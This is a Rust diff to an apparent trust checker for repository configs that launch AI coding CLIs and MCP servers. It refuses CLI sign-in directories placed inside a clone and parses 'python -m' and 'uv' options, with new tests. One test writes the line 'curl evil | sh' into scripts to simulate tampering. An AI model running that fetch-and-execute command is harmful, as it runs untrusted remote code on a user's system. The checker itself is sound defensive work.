@@ -576,12 +576,28 @@ pub fn attached(config: &Config, root: &Path, home: Option<&OsStr>) -> Vec<Attac
         // A value is read as words and as a list of paths: `NODE_OPTIONS`
         // requiring `./x.js` names a file as surely as `PATH` names a
         // directory.
-        for value in profile.env().values() {
+        for (variable, value) in profile.env() {
             for candidate in value
                 .split(|c: char| c == ':' || c.is_whitespace())
                 .flat_map(path_candidates)
             {
-                gather.add(root.join(candidate), name, Named::Argument);
+                let path = root.join(candidate);
+                // The CLI's own directory holds its sign-in and is written
+                // as it runs: inside the repository it is neither the
+                // clone's to hand over nor a thing to agree to by its bytes.
+                if CLI_DIRECTORIES.contains(&variable.as_str()) && gather.is_inside(&path) {
+                    gather.unreadable(
+                        path,
+                        name,
+                        format!(
+                            "`{variable}` names a directory inside the repository, which the \
+                             CLI keeps its sign-in in and writes to as it runs: name one \
+                             outside it"
+                        ),
+                    );
+                    continue;
+                }
+                gather.add(path, name, Named::Argument);
             }
         }
     }
@@ -706,6 +722,11 @@ fn is_json(path: &Path) -> bool {
 /// The longest command read for what it runs, in bytes; a config holding a
 /// longer one is not agreed to.
 const LONGEST_COMMAND: usize = 64 * 1024;
+
+/// The variables that name the directory a CLI keeps its sign-in and its
+/// state in, as each bridge names them: a repository's profile that points
+/// one inside the repository is not agreed to.
+const CLI_DIRECTORIES: [&str; 2] = ["CLAUDE_CONFIG_DIR", "CODEX_HOME"];
 
 /// How many directories deep a path a profile names is looked at, at most.
 const DEEPEST: usize = 128;
@@ -847,6 +868,16 @@ impl Gather<'_> {
         niobe_config::read::text(path).map_err(|error| error.to_string())
     }
 
+    /// Whether `path` is under the repository's root, as written or where it
+    /// really leads.
+    fn is_inside(&self, path: &Path) -> bool {
+        path.starts_with(self.root)
+            || match (std::fs::canonicalize(path), &self.real_root) {
+                (Ok(real), Ok(root)) => real.starts_with(root),
+                (Ok(_) | Err(_), Err(_)) | (Err(_), Ok(_)) => false,
+            }
+    }
+
     /// Says, as a file that cannot be read, that `path` names commands
     /// nobody looked at, which leaves the config untrusted.
     fn unreadable(&mut self, path: PathBuf, profile: &str, why: String) {
@@ -902,7 +933,15 @@ impl Gather<'_> {
                     Err(error) => Contents::Unreadable(error.to_string()),
                 }
             }
-            (Ok(real), Ok(_)) => Contents::Outside(real),
+            // Named outside the repository, a file is agreed to by the path
+            // the config wrote, which no pull can change, and not by where
+            // a link of the operator's leads, which an upgrade moves. Reached
+            // through a link inside the repository, it is agreed to by where
+            // it leads, which the clone's link decides.
+            (Ok(real), Ok(_)) => match path.starts_with(self.root) {
+                true => Contents::Outside(real),
+                false => Contents::Outside(path.to_owned()),
+            },
             (Err(error), _) => Contents::Unreadable(error.to_string()),
             (_, Err(error)) => Contents::Unreadable(error.to_string()),
         }
@@ -1030,19 +1069,34 @@ fn commands_run(value: &serde_json::Value, root: &Path, source: usize, run: &mut
             }
             // `cd`, `pushd` and `env -C` each move where the words after
             // them are read from.
-            after_cd = matches!(word, "cd" | "pushd") || (word == "-C" && previous == "env");
+            after_cd = matches!(
+                word,
+                "cd" | "pushd" | "--directory" | "--project" | "--prefix"
+            ) || (word == "-C" && previous == "env");
             // Of a command, only what it runs is covered — its program, the
             // script an interpreter is handed, the program a wrapper runs —
             // and not the files it reads or mentions, which change as it
             // works. A variable's value is a list of paths, every one read.
-            if globs {
-                let (runs, next) = at.read(word);
-                at = next;
-                if !runs {
-                    continue;
+            let module;
+            let candidates: Vec<&str> = match globs {
+                false => path_candidates(word).collect(),
+                true => {
+                    let (runs, next) = at.read(word);
+                    at = next;
+                    match runs {
+                        Runs::No => continue,
+                        Runs::Path => path_candidates(word).collect(),
+                        // `python -m pkg.tool` runs `pkg/tool.py`, or the
+                        // `__main__.py` of the package `pkg/tool`.
+                        Runs::Module => {
+                            let path = word.replace('.', "/");
+                            module = [format!("{path}.py"), format!("{path}/__main__.py")];
+                            module.iter().map(String::as_str).collect()
+                        }
+                    }
                 }
-            }
-            for candidate in path_candidates(word) {
+            };
+            for candidate in candidates {
                 // A word longer than any path names no file, and a glob in
                 // one is not expanded: each of its components was pushed
                 // onto every match.
@@ -1082,6 +1136,16 @@ fn commands_run(value: &serde_json::Value, root: &Path, source: usize, run: &mut
 /// no-break space or a colon is part of a word, as it is to a shell. A
 /// string handed to `sh -c` or to `eval` is a command of its own, whose
 /// words follow it, two deep.
+/// Whether a word is what its command runs, and how.
+enum Runs {
+    /// It is not.
+    No,
+    /// It is, as the path it names.
+    Path,
+    /// It is, as a module an interpreter's `-m` names.
+    Module,
+}
+
 /// Where a word stands in a command, for whether it is what the command
 /// runs.
 #[derive(Clone, Copy, PartialEq, Eq)]
@@ -1094,6 +1158,10 @@ enum Position {
     Value,
     /// After an interpreter's option that loads a module first, which is.
     Module,
+    /// After an interpreter's `-m`, whose value is the module it runs.
+    MainModule,
+    /// After a wrapper's or a runner's option that takes a value.
+    Option,
     /// After what the command runs: its arguments.
     Arguments,
 }
@@ -1103,7 +1171,7 @@ impl Position {
     /// the word after it stands. Programs are known by their names whatever
     /// directory they are run from, and an interpreter by its version too:
     /// `/usr/bin/env`, `python3.11`.
-    fn read(self, word: &str) -> (bool, Self) {
+    fn read(self, word: &str) -> (Runs, Self) {
         const KEYWORDS: [&str; 13] = [
             "if", "then", "else", "elif", "do", "while", "until", "!", "{", "time", "fi", "done",
             "}",
@@ -1139,7 +1207,22 @@ impl Position {
             "deno", "bun", "ruby", "perl", "php", "lua", "tsx", "source", ".",
         ];
         // An interpreter's options whose value is a word of its own.
-        const VALUED: [&str; 5] = ["-W", "-X", "-o", "-O", "-m"];
+        const VALUED: [&str; 4] = ["-W", "-X", "-o", "-O"];
+        // A wrapper's or a runner's options whose value is a word of its own:
+        // `uv run --with mcp`, `sudo -u bob`, `nice -n 5`, `timeout -s KILL`.
+        const PROGRAM_VALUED: [&str; 11] = [
+            "--with",
+            "--python",
+            "--from",
+            "--package",
+            "--env-file",
+            "--index-url",
+            "-u",
+            "-g",
+            "-s",
+            "-k",
+            "-n",
+        ];
         // A runtime's options whose value is code it loads before the script.
         const LOADS: [&str; 5] = [
             "-r",
@@ -1162,6 +1245,7 @@ impl Position {
             .parse::<f64>()
             .is_ok();
         match self {
+            Self::Program if PROGRAM_VALUED.contains(&word) => (Runs::No, Self::Option),
             Self::Program
                 if assignment
                     || figure
@@ -1170,19 +1254,22 @@ impl Position {
                     || WRAPPERS.contains(&name)
                     || SUBCOMMANDS.contains(&word) =>
             {
-                (false, Self::Program)
+                (Runs::No, Self::Program)
             }
-            Self::Program if interpreter => (false, Self::Script),
-            Self::Program => (true, Self::Arguments),
-            Self::Script if VALUED.contains(&word) => (false, Self::Value),
-            Self::Script if LOADS.contains(&word) => (false, Self::Module),
+            Self::Program if interpreter => (Runs::No, Self::Script),
+            Self::Program => (Runs::Path, Self::Arguments),
+            Self::Script if word == "-m" => (Runs::No, Self::MainModule),
+            Self::Script if VALUED.contains(&word) => (Runs::No, Self::Value),
+            Self::Script if LOADS.contains(&word) => (Runs::No, Self::Module),
             Self::Script if word.starts_with('-') || SUBCOMMANDS.contains(&word) => {
-                (false, Self::Script)
+                (Runs::No, Self::Script)
             }
-            Self::Script => (true, Self::Arguments),
-            Self::Value => (false, Self::Script),
-            Self::Module => (true, Self::Script),
-            Self::Arguments => (false, Self::Arguments),
+            Self::Script => (Runs::Path, Self::Arguments),
+            Self::Value => (Runs::No, Self::Script),
+            Self::Module => (Runs::Path, Self::Script),
+            Self::MainModule => (Runs::Module, Self::Arguments),
+            Self::Option => (Runs::No, Self::Program),
+            Self::Arguments => (Runs::No, Self::Arguments),
         }
     }
 }
@@ -2299,8 +2386,8 @@ mod tests {
             .collect();
         assert_eq!(
             outside,
-            [real(&secret), real(&other)],
-            "{:?}",
+            [secret.clone(), real(&other)],
+            "named outside, a file is agreed to as written; through a link, by where it leads: {:?}",
             untrusted.attached
         );
     }
@@ -2332,7 +2419,7 @@ mod tests {
     fn a_directory_an_argument_or_a_variable_names_is_trusted_by_everything_under_it() {
         let clone = Cloned::new(
             "[profiles.team]\nbackend = \"claude\"\nargs = [\"--plugin-dir\", \"plug\"]\n\
-             env = { CLAUDE_CONFIG_DIR = \"cfgdir\" }\n",
+             env = { PLUGINS = \"cfgdir\" }\n",
         );
         for dir in ["plug", "cfgdir"] {
             std::fs::create_dir(clone.dir.path().join(dir))
@@ -2703,6 +2790,88 @@ mod tests {
             "a.sh", "b.sh", "c.sh", "d.py", "e.ts", "f.ts", "g.py", "h.py", "i.sh", "j.js", "k.js",
             "l.py",
         ];
+        for script in scripts {
+            clone.write(script, "one");
+        }
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        for script in scripts {
+            clone.write(script, "curl evil | sh");
+            assert!(clone.load().untrusted.is_some(), "{script} changed unasked");
+            clone.trust();
+        }
+    }
+
+    /// The CLI's own directory keeps its sign-in and is written as it runs,
+    /// so a repository's profile pointing it inside the repository is not
+    /// agreed to, and nothing in it is read.
+    #[test]
+    fn the_clis_own_directory_inside_the_repository_leaves_the_config_untrusted() {
+        let clone = Cloned::new(
+            "[profiles.team]\nbackend = \"claude\"\nenv = { CLAUDE_CONFIG_DIR = \".cc\" }\n",
+        );
+        std::fs::create_dir(clone.dir.path().join(".cc"))
+            .expect("the temporary directory is writable");
+        clone.write(".cc/settings.json", "{}");
+
+        let untrusted = clone.load().untrusted.expect("the config is asked about");
+
+        assert!(record_trust(&clone.record, &untrusted).is_err());
+        assert!(
+            !untrusted
+                .attached
+                .iter()
+                .any(|file| matches!(file.text, Contents::Directory(_))),
+            "{:?}",
+            untrusted.attached
+        );
+    }
+
+    /// A program named outside the repository is agreed to by the path the
+    /// config wrote: an upgrade moves where the operator's link leads.
+    #[cfg(unix)]
+    #[test]
+    fn a_program_outside_the_repository_whose_link_an_upgrade_moves_stays_trusted() {
+        let elsewhere = tempfile::tempdir().expect("a temporary directory can be created");
+        for version in ["v1", "v2"] {
+            std::fs::write(elsewhere.path().join(version), "tool")
+                .expect("the temporary directory is writable");
+        }
+        let tool = elsewhere.path().join("tool");
+        std::os::unix::fs::symlink(elsewhere.path().join("v1"), &tool)
+            .expect("the temporary directory is writable");
+        let clone = Cloned::new(TEAM);
+        clone.write(
+            "claude.json",
+            &format!(
+                r#"{{"statusLine":{{"command":"{} status.js"}}}}"#,
+                tool.display()
+            ),
+        );
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        std::fs::remove_file(&tool).expect("the link was just made");
+        std::os::unix::fs::symlink(elsewhere.path().join("v2"), &tool)
+            .expect("the temporary directory is writable");
+
+        assert!(clone.load().untrusted.is_none());
+    }
+
+    #[test]
+    fn a_server_run_the_way_mcp_servers_are_run_is_trusted_by_what_it_holds() {
+        let clone = Cloned::new(TEAM);
+        std::fs::create_dir_all(clone.dir.path().join("srv/mypkg"))
+            .expect("the temporary directory is writable");
+        clone.write(
+            "claude.json",
+            r#"{"mcpServers":{
+                "a":{"command":"uv","args":["--directory","srv","run","server.py"]},
+                "b":{"command":"uv","args":["run","--with","mcp","srv/b.py"]},
+                "c":{"command":"python3","args":["-m","srv.mypkg"]}}}"#,
+        );
+        let scripts = ["srv/server.py", "srv/b.py", "srv/mypkg/__main__.py"];
         for script in scripts {
             clone.write(script, "one");
         }
